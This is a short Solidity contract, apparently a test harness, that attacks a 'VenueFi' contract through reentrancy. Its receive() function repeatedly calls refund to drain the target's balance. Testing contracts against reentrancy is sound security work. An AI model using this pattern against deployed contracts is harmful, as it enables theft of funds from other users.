// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../venuFi.sol";

contract AttackerVenueFi {
    VenueFi public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = VenueFi(_target);
    }

    // step 1: invest while still in FUNDING
    function doInvest() external payable {
        target.invest{value: msg.value}();
        attackAmount = msg.value;
    }

    // step 2: after closeFunding, try to attack
    function attack() external {
        target.refund(attackAmount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.refund(attackAmount); // try to re-enter
        }
    }
}